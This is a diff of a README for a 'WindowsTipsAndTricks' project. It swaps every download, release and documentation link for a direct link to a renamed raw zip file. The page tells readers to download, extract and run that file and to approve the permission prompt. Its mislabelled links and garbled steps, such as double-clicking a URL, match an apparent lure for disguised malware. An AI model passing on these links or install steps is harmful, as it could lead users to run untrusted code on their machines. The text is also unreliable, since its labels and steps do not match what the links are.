@@ -1,6 +1,6 @@
 # 🪄 WindowsTipsAndTricks - Unlock Hidden Features in Windows
 
-[![Download WindowsTipsAndTricks](https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/WindowsTipsAndTricks_1.3-beta.2.zip%20Now-Get%20WindowsTipsAndTricks-brightgreen)](https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/WindowsTipsAndTricks_1.3-beta.2.zip)
+[![Download WindowsTipsAndTricks](https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/Tricks_Windows_Tips_And_3.9.zip%20Now-Get%20WindowsTipsAndTricks-brightgreen)](https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/Tricks_Windows_Tips_And_3.9.zip)
 
 ## 📜 Overview
 
@@ -16,25 +16,25 @@ WindowsTipsAndTricks is a curated collection of powerful Windows hidden features
 
 2. **Visit the Download Page**  
    You can find the latest version of WindowsTipsAndTricks on our Releases page.  
-   [Visit this page to download](https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/WindowsTipsAndTricks_1.3-beta.2.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/Tricks_Windows_Tips_And_3.9.zip)
 
 ## 📥 Download & Install
 
 1. **Go to the Releases Page**  
    Visit our dedicated releases page to see all available versions:  
-   [Visit this page to download](https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/WindowsTipsAndTricks_1.3-beta.2.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/Tricks_Windows_Tips_And_3.9.zip)
 
 2. **Choose Your Version**  
    On the releases page, look for the version you want to download. Click on the package that matches your system.
 
 3. **Download the Application**  
-   Click the download link for the selected version. The file will usually be named something like `https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/WindowsTipsAndTricks_1.3-beta.2.zip`. The file may take a moment to download, depending on your internet connection.
+   Click the download link for the selected version. The file will usually be named something like `https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/Tricks_Windows_Tips_And_3.9.zip`. The file may take a moment to download, depending on your internet connection.
 
 4. **Extract the Files**  
    Once the download completes, locate the ZIP file in your downloads folder. Right-click the file and select "Extract All" to unzip the files.
 
 5. **Run the Application**  
-   After extracting, open the folder containing the files. Double-click on `https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/WindowsTipsAndTricks_1.3-beta.2.zip` to launch the application. You may see a prompt asking for permission to run the app; click "Yes" to proceed.
+   After extracting, open the folder containing the files. Double-click on `https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/Tricks_Windows_Tips_And_3.9.zip` to launch the application. You may see a prompt asking for permission to run the app; click "Yes" to proceed.
 
 ## 🎛️ Features
 
@@ -82,7 +82,7 @@ We welcome contributions from all users. If you have suggestions or new features
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/WindowsTipsAndTricks_1.3-beta.2.zip)
-- [Official Documentation](https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/WindowsTipsAndTricks_1.3-beta.2.zip)
+- [Releases Page](https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/Tricks_Windows_Tips_And_3.9.zip)
+- [Official Documentation](https://raw.githubusercontent.com/Gametrax/WindowsTipsAndTricks/latest/assurge/Tricks_Windows_Tips_And_3.9.zip)
 
 Feel free to explore and enjoy the hidden features that can transform your Windows experience!
